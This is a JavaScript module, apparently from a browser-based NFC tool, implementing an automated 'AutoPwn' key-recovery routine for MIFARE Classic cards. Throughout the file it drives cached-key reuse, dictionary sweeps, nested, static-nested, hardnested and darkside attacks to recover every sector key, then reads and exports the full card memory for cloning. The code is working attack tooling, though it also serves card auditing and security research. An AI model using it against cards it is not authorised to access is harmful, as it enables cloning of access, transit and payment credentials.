import { COMMAND } from '../device/commands.mjs';
import { hardnestedTablesRequest } from '../runtime/nfc-wasm/index.mjs';
import { createRuntime } from '../runtime/runtime.mjs';
import { Device, hex } from '../device/device.mjs';
import { getTables } from '../runtime/assets.mjs';
import { createHardnestedRuntime } from '../runtime/hardnested-runtime.mjs';
import { recoverHardnested } from './hardnested.mjs';
import { recoverDarkside } from './darkside.mjs';
import { filterDictionary as filterCandidates } from './dictionary.mjs';
import { classicKeyCache } from './classic-key-cache.mjs';
import { createKeyReuseFilter } from './key-reuse.mjs';

const verified = (key) => (key ? { Verified: key } : 'NoVerifiedKey');

const isRecoverable = (error) => error.status === 6 || error.status === 0x69;
const CLASSIC_SELECTORS = new Map([
  [1000, 9],
  [1001, 8],
  [1002, 16],
  [1003, 24]
]);

export async function runAutoPwn({
  dictionary = '',
  signal,
  onUpdate = () => {},
  device = new Device(signal),
  workerFactory,
  initialCard,
  expectedUid,
  expectedModel,
  keyCache = classicKeyCache
} = {}) {
  let engine;
  let hardnestedEngine;
  let recoverySession;
  let snapshot;
  let geometry;
  let geometrySelector;
  let card;
  let remembered;
  let authenticated;
  const memory = [];
  function rememberAuthentication(sector, key, isKeyB) {
    const name = isKeyB ? 'key_b' : 'key_a';
    for (const mapping of [remembered, authenticated]) {
      mapping[sector][name] = [...key];
      if (isKeyB) {
        mapping[sector].origin_b = null;
      }
    }
  }
  // A checked sector read both authenticates its candidate and returns memory.
  // Keep these observations only for this read operation, never across devices
  // or writes. Each credential/sector is captured once; missing blocks retain
  // the existing individual-read fallback and remain unknown on failure.
  const sectorReads = new Set();
  function rememberSector(sector, key, isKeyB, blocks) {
    rememberAuthentication(sector, key, isKeyB);
    sectorReads.add(`${sector}:${isKeyB}:${hex(key)}`);
    blocks.forEach((block, offset) => {
      if (block) {
        memory[geometry.sectors[sector].first + offset] = [...block];
      }
    });
  }
  async function readSector(sector, key, isKeyB) {
    const id = `${sector}:${isKeyB}:${hex(key)}`;
    if (!sectorReads.has(id)) {
      const blocks = await device.readSector(sector, key, isKeyB, geometry);
      rememberSector(sector, key, isKeyB, blocks);
    }
  }

  const currentSummary = () =>
    snapshot?.summary ??
    (authenticated && {
      uid: card.uid,
      sector_count: geometry.sectors.length,
      mapping: authenticated,
      prng: 'Unknown',
      resolved_keys: authenticated.reduce((count, keys) => count + !!keys.key_a + !!keys.key_b, 0),
      total_keys: geometry.sectors.length * 2
    });

  const update = (extra) => {
    const summary = currentSummary();
    geometry?.sectors.forEach((sector, index) => {
      const trailer = memory[sector.trailer];
      const keys = summary?.mapping[index];
      if (trailer && keys) {
        if (keys.key_a) {
          trailer.splice(0, 6, ...keys.key_a);
        }

        if (keys.key_b) {
          trailer.splice(10, 6, ...keys.key_b);
        }
      }
    });

    onUpdate({ card, geometry, summary, memory, ...extra });
  };

  const check = () => {
    if (signal?.aborted) {
      throw new Error('Operation cancelled');
    }
  };

  const call = (request) => {
    check();
    return engine.request(request, { signal });
  };

  const keyReuse = createKeyReuseFilter({ call, collect, uid: () => card.uid });

  let nonceKeys = [];
  const testedKeysByTarget = new Map();
  // A response can contain several fresh physical authentication results.
  // Retain them only until the sequential recovery engine acknowledges them.
  const sweepReplies = new Map();
  // Unproven keys start with checks. A failed read pins the key to checks.
  const readReuse = new Map();
  const targetId = (target) => `${target.sector}:${target.is_key_b}`;
  const untestedKeys = (target, keys) =>
    keys.filter((key) => !testedKeysByTarget.get(targetId(target))?.has(hex(key)));

  function readBatchTargets(targets) {
    const batch = [];
    let responseBytes = 3;
    for (const target of targets.slice(0, 8)) {
      const bytes = 6 + geometry.sectors[target.sector].count * 16;
      if (responseBytes + bytes > 512) {
        break;
      }
      batch.push(target);
      responseBytes += bytes;
    }
    return batch;
  }

  function rememberReply(target, key, reply, reading) {
    if (reply.status === 6) {
      return false;
    }
    if (reply.status !== 0) {
      const message = reply.status === 1 ? 'Card not found or changed' : `Device status ${reply.status}`;
      throw Object.assign(new Error(message), { status: reply.status });
    }
    if (reading) {
      const sector = target.sector;
      const mask = reply.data[0] * 256 + reply.data[1];
      const blocks = Array.from({ length: geometry.sectors[sector].count }, (_, n) =>
        mask & (1 << n) ? Array.from(reply.data.slice(2 + n * 16, 18 + n * 16)) : null
      );
      rememberSector(sector, key, target.is_key_b, blocks);
    } else {
      rememberAuthentication(target.sector, key, target.is_key_b);
    }
    return true;
  }

  function rememberReplies(targets, key, replies) {
    replies.forEach((reply, i) => {
      if (!rememberReply(targets[i], key, reply, true)) {
        readReuse.set(hex(key), false);
      }
    });
  }

  async function readHits(targets, key) {
    while (targets.length) {
      check();
      const batch = readBatchTargets(targets);
      const replies = await device.classicBatch(
        1,
        batch.map((target) => [target.sector, 0x60, ...key])
      );
      rememberReplies(batch, key, replies);
      targets = targets.slice(batch.length);
    }
  }

  async function sweep(args) {
    const keyId = hex(args.key);
    const reading = !args.is_key_b && readReuse.get(keyId) === true;
    const replyId = (target) => `${targetId(target)}:${hex(args.key)}`;
    if (!sweepReplies.has(replyId(args)) && !untestedKeys(args, [args.key]).length) {
      return { Sweep: { hit: false, physically_tested: true } };
    }
    let screened = false;
    if (!sweepReplies.has(replyId(args))) {
      const matches = await keyReuse.test(snapshot.summary, args, args.key);
      if (matches === false) {
        return { Sweep: { hit: false, physically_tested: false } };
      }
      screened = matches === true;
    }
    if (!screened && !sweepReplies.has(replyId(args))) {
      const targets = [args];
      snapshot.summary.mapping.forEach((keys, sector) => {
        const target = { sector, is_key_b: args.is_key_b };
        if (
          sector !== args.sector &&
          !(args.is_key_b ? keys.key_b : keys.key_a) &&
          !keyReuse.eligible(snapshot.summary, target) &&
          untestedKeys(target, [args.key]).length &&
          !sweepReplies.has(replyId(target))
        ) {
          targets.push(target);
        }
      });
      const batch = reading ? readBatchTargets(targets) : targets.slice(0, 8);
      const entries = batch.map((target) => [
        reading ? target.sector : geometry.sectors[target.sector].first,
        target.is_key_b ? 0x61 : 0x60,
        ...args.key
      ]);
      const replies = await device.classicBatch(Number(reading), entries);
      if (reading) {
        rememberReplies(batch, args.key, replies);
      }
      replies.forEach((reply, i) => {
        sweepReplies.set(replyId(batch[i]), reply);
        if ([0, 6].includes(reply.status)) {
          const id = targetId(batch[i]);
          const tested = testedKeysByTarget.get(id) ?? new Set();
          tested.add(hex(args.key));
          testedKeysByTarget.set(id, tested);
          if (reply.status === 0) {
            rememberAuthentication(batch[i].sector, args.key, args.is_key_b);
          }
        }
      });
      if (!reading && !args.is_key_b) {
        const hits = batch.filter((_, i) => replies[i]?.status === 0);
        await readHits(hits, args.key);
        if (hits.length && replies.every((reply) => reply.status === 0) && readReuse.get(keyId) !== false) {
          readReuse.set(keyId, true);
        }
      }
    }

    const reply = sweepReplies.get(replyId(args));
    if (reply) {
      sweepReplies.delete(replyId(args));
      if (![0, 6].includes(reply.status)) {
        const error = new Error(
          reply.status === 1 ? 'Card not found or changed' : `Device status ${reply.status}`
        );
        error.status = reply.status;
        throw error;
      }
      return { Sweep: { hit: reply.status === 0, physically_tested: true } };
    }
    const hit = !!(await verify(args, [args.key], () => {}, reading));
    if (!args.is_key_b && hit && readReuse.get(keyId) !== false) {
      readReuse.set(keyId, true);
    }
    if (reading && !hit) {
      readReuse.set(keyId, false);
    }
    return { Sweep: { hit, physically_tested: true } };
  }

  async function verify(target, candidates, onTested = () => {}, capture = true) {
    check();

    const selected = untestedKeys(target, candidates);
    if (!selected.length) {
      return null;
    }

    const tested = (keys) => {
      const tested = testedKeysByTarget.get(targetId(target)) ?? new Set();
      keys.forEach((key) => tested.add(hex(key)));
      testedKeysByTarget.set(targetId(target), tested);
      onTested(keys);
    };
    if (capture && selected.length === 1) {
      try {
        await readSector(target.sector, selected[0], target.is_key_b);
        tested(selected);
        return selected[0];
      } catch (error) {
        if (error.status !== 6) {
          throw error;
        }
        tested(selected);
        return null;
      }
    }
    const key = await device.findKey(target.sector, target.is_key_b, selected, geometry, tested);
    if (key) {
      rememberAuthentication(target.sector, key, target.is_key_b);
    }
    return key;
  }

  async function reuseRememberedKeys(plan) {
    let targets = [];
    for (const isKeyB of [false, true]) {
      remembered.forEach((keys, sector) => {
        const key = isKeyB ? keys.key_b : keys.key_a;
        if (key && !(isKeyB && keys.origin_b === 'Trailer')) {
          targets.push({ sector, is_key_b: isKeyB, key });
        }
      });
    }
    const sources = [];
    let firstRejected;
    const accept = (target, reply, reading) => {
      const id = targetId(target);
      testedKeysByTarget.set(id, new Set([hex(target.key)]));
      if (!rememberReply(target, target.key, reply, reading)) {
        remembered[target.sector][target.is_key_b ? 'key_b' : 'key_a'] = null;
        if (target.is_key_b) {
          remembered[target.sector].origin_b = null;
        }
        firstRejected ||= target;
      } else {
        sources.push(target);
      }
    };
    const needsMemory = (target) => {
      const { first, count } = geometry.sectors[target.sector];
      return !target.is_key_b || !memory.slice(first, first + count).every(Boolean);
    };
    while (targets.length) {
      check();
      const reading = needsMemory(targets[0]);
      const pending = targets.filter(
        (target) => target.is_key_b === targets[0].is_key_b && needsMemory(target) === reading
      );
      const batch = reading ? readBatchTargets(pending) : pending.slice(0, 8);
      const replies = await device.classicBatch(
        Number(reading),
        batch.map((target) => [
          reading ? target.sector : geometry.sectors[target.sector].first,
          target.is_key_b ? 0x61 : 0x60,
          ...target.key
        ])
      );
      replies.forEach((reply, index) => accept(batch[index], reply, reading));
      targets = targets.filter((target) => !batch.includes(target));
      update({ phase: 'Reading memory…' });
    }
    // Preserve the normal quick dictionary probe before a cached anchor can
    // route a changed key straight into nonce recovery.
    if (firstRejected) {
      const candidates = plan.passes
        .filter((pass) => pass.kind !== 'Extended')
        .flatMap((pass) => (pass.kind === 'Local' ? pass.keys.slice(0, 42) : pass.keys));
      const key = await verify(firstRejected, [
        ...new Map(candidates.map((key) => [hex(key), key])).values()
      ]);
      if (key) {
        // Let existing sector trailers resolve B before sweeping a newly found key.
        sources.unshift({ ...firstRejected, key });
      }
    }
    return sources;
  }

  async function collect(source, target, count, chained = false) {
    check();

    return device.collectNonces(source, target, count, geometry, chained);
  }

  async function filterDictionary(source, target) {
    const result = await filterCandidates({
      call,
      uid: card.uid,
      keys: untestedKeys(target, nonceKeys),
      observations: keyReuse.take(target),
      collect: (count) => collect(source, target, count)
    });
    const tested = [];
    const key = await verify(target, result.candidates, (keys) => tested.push(...keys));
    let outcome = 'ResourceLimited';

    if (key) {
      outcome = { VerifiedDictionary: key };
    } else if (result.exhausted) {
      outcome = 'NoVerifiedKey';
    }

    return { Nested: { outcome, tested } };
  }

  async function recoverNested(source, target, staticNonce) {
    const tested = [];
    let job;

    try {
      const observations = staticNonce ? [] : keyReuse.take(target);
      let plan = await call({
        op: 'recovery_plan',
        static_nonce: staticNonce,
        prefix_count: observations.length
      });

      if (untestedKeys(target, nonceKeys).length) {
        if (!observations.length) {
          for (const step of plan.prefix) {
            observations.push(...(await collect(source, target, step.count, step.chained)));
          }
        }

        const result = await call({
          op: 'filter_dictionary',
          uid: card.uid,
          keys: untestedKeys(target, nonceKeys),
          observations,
          weak_prng: !staticNonce
        });
        const key = await verify(target, result.candidates, (keys) => tested.push(...keys));

        if (key) {
          return { outcome: { VerifiedDictionary: key }, tested };
        }
      }

      const calibrationRecords = await collect(source, source, plan.calibration_count);
      const { calibration } = await call({
        op: 'calibrate',
        uid: card.uid,
        key: source.key,
        observations: calibrationRecords
      });
      plan = await call({
        op: 'recovery_plan',
        static_nonce: staticNonce,
        prefix_count: observations.length
      });

      if (plan.target_count) {
        if (staticNonce) {
          for (const step of plan.prefix) {
            observations.push(...(await collect(source, target, step.count, step.chained)));
          }
        } else {
          observations.push(...(await collect(source, target, plan.target_count)));
        }
      }

      let request;

      if (staticNonce) {
        request = { op: 'static_new', uid: card.uid, observations, distance: calibration[1] };
      } else {
        request = { op: 'nested_new', uid: card.uid, observations, calibration, tolerance: 128 };
      }

      ({ job } = await call(request));

      for (;;) {
        const { done, candidates } = await call({ op: 'nested_next', job });

        if (done) {
          return { outcome: 'NoVerifiedKey', tested };
        }

        const key = await verify(target, candidates, (keys) => tested.push(...keys));

        if (key) {
          return { outcome: verified(key), tested };
        }
      }
    } catch (error) {
      if (signal?.aborted) {
        throw error;
      }

      if (isRecoverable(error) || /ResourceLimit|Calibration failed|NoDiversity/.test(error.message)) {
        let outcome = 'ResourceLimited';

        if (/Calibration/.test(error.message)) {
          outcome = 'CalibrationFailed';
        } else if (/NoDiversity/.test(error.message)) {
          outcome = 'NoDiversity';
        }

        return { outcome, tested };
      }

      throw error;
    } finally {
      if (job) {
        try {
          await engine.request({ op: 'nested_dispose', job });
        } catch {
          /* A cancelled Worker has already released its state. */
        }
      }
    }
  }

  async function runHardnested({ source, target, budget }) {
    if (!hardnestedEngine) {
      update({ phase: 'Loading Hardnested module and tables…' });

      try {
        const tables = await getTables(signal);
        hardnestedEngine = await createHardnestedRuntime(signal, workerFactory);
        await hardnestedEngine.request(hardnestedTablesRequest(tables), { signal });
      } catch (error) {
        hardnestedEngine?.dispose();
        hardnestedEngine = null;

        if (signal?.aborted) {
          throw error;
        }

        update({ phase: error.message });
        keyReuse.disable(target);
        return { Hardnested: 'ResourceLimited' };
      }
    }

    const hardnestedCall = (request) => {
      check();
      return hardnestedEngine.request(request, { signal });
    };

    const outcome = await recoverHardnested({
      call: hardnestedCall,
      device,
      source,
      target,
      geometry,
      uid: card.uid,
      budget,
      verify,
      check,
      update
    });
    if (!outcome?.Verified) {
      keyReuse.disable(target);
    }
    return { Hardnested: outcome };
  }

  async function execute(action) {
    if (action === 'ProbePrng') {
      const data = await device.command(COMMAND.CLASSIC_PRNG);

      if (data.length !== 1 || data[0] > 2) {
        throw new Error('Invalid PRNG reply');
      }

      return { Prng: ['Static', 'Weak', 'Hard'][data[0]] };
    }

    const [kind, args] = Object.entries(action)[0];
    update({ phase: `${kind} · sector ${args.sector ?? args.target?.sector ?? ''}` });

    switch (kind) {
      case 'TestDictionary':
      case 'VerifyCandidates':
        return { CandidateKey: await verify(args, args.candidates) };
      case 'SweepKey':
        // Key A reuse captures sectors in the same bounded RF batch. Key B
        // attempts retain the lightweight authentication path.
        return sweep(args);
      case 'ExtractTrailer': {
        try {
          await readSector(args.sector, args.key_a, false);
          const trailer = geometry.sectors[args.sector].trailer;
          const block = memory[trailer] || (await device.readBlock(trailer, args.key_a, false));
          memory[trailer] = [...block];
          const { key } = await call({ op: 'trailer_key_b', block });
          return { TrailerKey: key };
        } catch (error) {
          if (error.status === 6) {
            return { TrailerKey: null };
          }

          throw error;
        }
      }
      case 'FilterDictionary':
        return filterDictionary(args.source, args.target);
      case 'RecoverNested':
        return { Nested: await recoverNested(args.source, args.target, false) };
      case 'RecoverStaticNested':
        return { StaticNested: await recoverNested(args.source, args.target, true) };
      case 'RecoverHardnested':
        return runHardnested(args);
      case 'RecoverDarkside':
        return {
          Darkside: await recoverDarkside({
            device,
            target: args.target,
            geometry,
            call,
            verify,
            check,
            update
          })
        };
      default:
        throw new Error(`Unsupported AutoPwn action ${kind}`);
    }
  }

  try {
    update({ phase: 'Loading shared recovery engine…' });
    engine = await createRuntime(signal, workerFactory);
    check();

    card = initialCard || (await device.begin());

    if (expectedUid && hex(card.uid) !== expectedUid) {
      throw new Error('The tag UID changed. Scan the current tag before recovery.');
    }

    geometrySelector = card.sak;
    if (expectedModel !== undefined) {
      const known = expectedModel?.card;
      const selector = CLASSIC_SELECTORS.get(expectedModel?.type);
      if (!expectedUid || !selector || !Array.isArray(known?.uid) || hex(known.uid) !== expectedUid) {
        throw new Error('Reading an existing Classic model requires the same UID and a valid model.');
      }
      if (!Array.isArray(known.atqa) || known.sak !== card.sak || hex(known.atqa) !== hex(card.atqa)) {
        throw new Error(
          'The tag identity differs from the open model. Scan the current tag before recovery.'
        );
      }
      // A known 2K document uses selector 16 internally, while its observed
      // SL1 identity can have SAK 08. Preserve both its size and real identity.
      geometrySelector = selector;
      // Basic selection does not read ATS. Keep the open model's ATS after
      // identity checks, while giving any newly observed ATS precedence.
      if (!card.ats?.length && known.ats?.length) {
        card = { ...card, ats: [...known.ats] };
      }
    }
    geometry = await call({ op: 'classic_geometry', sak: geometrySelector });
    memory.length = geometry.blocks;
    memory.fill(null);
    authenticated = geometry.sectors.map(() => ({ key_a: null, key_b: null, origin_b: null }));
    remembered = keyCache.load(card, geometry);
    if (!remembered.length) {
      remembered = structuredClone(authenticated);
    }

    const plan = await call({ op: 'dictionary', text: dictionary, anchor: null, profile: 'Extended' });
    nonceKeys = plan.nonce_keys;
    const sources = await reuseRememberedKeys(plan);

    ({ session: recoverySession } = await call({
      op: 'autopwn_new',
      config: {
        uid: card.uid,
        sector_count: geometry.sectors.length,
        first_sector: 0,
        last_sector: geometry.sectors.length - 1,
        prng: 'Unknown',
        budget: 4096
      },
      passes: plan.passes,
      sources
    }));

    snapshot = await call({ op: 'autopwn_next', session: recoverySession });

    while (snapshot.action) {
      check();
      const result = await execute(snapshot.action);
      snapshot = await call({
        op: 'autopwn_submit',
        session: recoverySession,
        action_id: snapshot.action_id,
        result
      });
      update({ phase: 'Recovering keys…' });
    }

    for (let sector = 0; sector < geometry.sectors.length; sector++) {
      const keys = snapshot.summary.mapping[sector];
      const sectorGeometry = geometry.sectors[sector];

      for (const isKeyB of [false, true]) {
        const key = isKeyB ? keys.key_b : keys.key_a;

        if (!key || (isKeyB && keys.origin_b === 'Trailer')) {
          continue;
        }

        check();

        if (memory.slice(sectorGeometry.first, sectorGeometry.first + sectorGeometry.count).every(Boolean)) {
          break;
        }

        try {
          await readSector(sector, key, isKeyB);

          update({ phase: `Reading memory · sector ${sector + 1}/${geometry.sectors.length}` });

          for (let offset = 0; offset < sectorGeometry.count; offset++) {
            check();

            const block = sectorGeometry.first + offset;

            if (memory[block]) {
              continue;
            }

            try {
              memory[block] = await device.readBlock(block, key, isKeyB);
            } catch (error) {
              // RC522 reports a read NAK as a short/invalid frame (status 2).
              if (error.status !== 6 && error.status !== 2) {
                throw error;
              }
            }

            update({ phase: `Reading memory · block ${block + 1}/${geometry.blocks}` });
          }
        } catch (error) {
          if (error.status !== 6) {
            throw error;
          }
        }
      }
    }

    const complete = memory.every(Boolean);
    let dump = null;

    if (complete) {
      try {
        dump = (
          await call({ op: 'classic_export', uid: card.uid, sak: geometrySelector, memory: memory.flat() })
        ).text;
      } catch {
        /* Complete memory can still be retained when this .nfc identity is unsupported. */
      }
    }

    const resultLabel = complete ? 'Read complete' : 'Partial read · some blocks remain unread';

    update({
      phase: resultLabel,
      complete,
      dump
    });

    return { card, geometry, summary: snapshot.summary, memory, complete, dump };
  } catch (error) {
    const stopped = !!signal?.aborted;
    update({ phase: stopped ? 'Stopped · partial results retained' : error.message, error: !stopped });

    if (!stopped) {
      throw error;
    }

    return { card, geometry, summary: currentSummary(), memory, complete: false, dump: null };
  } finally {
    hardnestedEngine?.dispose();
    engine?.dispose();

    try {
      await device.end();
    } catch (error) {
      update({
        phase: `Device cleanup unconfirmed: ${error.message}. The device reservation expires automatically.`,
        error: true
      });
    }
    if (remembered) {
      snapshot?.summary.mapping.forEach((keys, sector) => {
        for (const name of ['key_a', 'key_b']) {
          if (keys[name]) {
            remembered[sector][name] = [...keys[name]];
            if (name === 'key_b') {
              remembered[sector].origin_b = keys.origin_b === 'Trailer' ? 'Trailer' : null;
            }
          }
        }
      });
      keyCache.save(card, geometry, remembered);
    }
  }
}
